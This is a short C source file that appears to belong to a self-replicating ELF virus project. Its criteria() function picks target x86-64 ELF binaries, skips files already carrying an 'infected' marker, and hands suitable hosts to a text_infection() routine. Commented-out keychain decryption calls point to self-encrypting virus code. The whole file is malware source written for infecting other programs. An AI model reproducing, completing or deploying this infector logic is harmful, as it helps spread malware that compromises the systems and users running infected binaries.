#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void criteria(struct s_host *host, struct s_keychain *keychain)
{
//	decrypt_left(keychain, (char *)&host_constructor, (void *)&criteria - (void *)&host_constructor);

	if (host->filesize < sizeof(Elf64_Ehdr))
		goto label_error;
	if (host->header->e_shoff + (host->header->e_shnum * sizeof(Elf64_Shdr)) != host->filesize)
		goto label_error;
	if (*(uint32_t *)host->header != ELF_MAGIC_NUMBER)
		goto label_error;
	if (host->header->e_ident[EI_CLASS] != X86_64_MAGIC_NUMBER)
		goto label_error;
	if (host->header->e_entry == 0)
		goto label_error;
	if (*(unsigned int *)((char *)&host->header->e_ident[EI_PAD]) == INFECTED_MAGIC_NUMBER)
		goto label_error;

//	update_keychain_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
//	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);

	text_infection(host, keychain);

label_error:
	printf("error\n");
	exit(1);
}
